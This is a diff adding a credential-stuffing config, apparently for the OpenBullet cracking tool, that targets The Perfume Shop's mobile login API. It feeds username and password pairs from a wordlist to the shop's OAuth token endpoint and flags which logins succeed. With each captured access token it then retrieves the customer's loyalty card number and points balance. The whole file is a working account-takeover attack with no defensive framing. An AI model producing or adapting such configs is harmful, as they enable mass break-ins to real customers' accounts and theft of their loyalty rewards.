@@ -1,0 +1,47 @@
+[SETTINGS]
+{
+  "Name": "Perfume Shop",
+  "SuggestedBots": 1,
+  "LastModified": "2019-04-02T12:54:39.7501162+01:00",
+  "AdditionalInfo": "",
+  "Author": "Spaceman",
+  "Version": "1.0.0",
+  "IgnoreResponseErrors": false,
+  "NeedsProxies": false,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+REQUEST POST "https://apptps.theperfumeshop.com/rest/oauth/token" 
+  CONTENT "username=<USER>&password=<PASS>&grant_type=password&client_id=mobile_android&client_secret=secret" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "User-Agent: okhttp/3.8.0" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+KEYCHECK 
+  KEYCHAIN Failure OR 
+    KEY "error_description\":\"Bad credentials" 
+  KEYCHAIN Success OR 
+    KEY "access_token" 
+PARSE "<SOURCE>" LR "access_token\":\"" "\",\"token_type" -> VAR "token" 
+REQUEST GET "https://apptps.theperfumeshop.com/rest/hybris/customers/current/loyalty" 
+  
+  HEADER "User-Agent: okhttp/3.8.0" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+  HEADER "Authorization: Bearer <token>" 
+PARSE "<SOURCE>" LR "cardNumber\":\"" "\",\"points" -> CAP "Card Number : " 
+PARSE "<SOURCE>" LR "points\":\"" "\"}" -> CAP "Points : " 
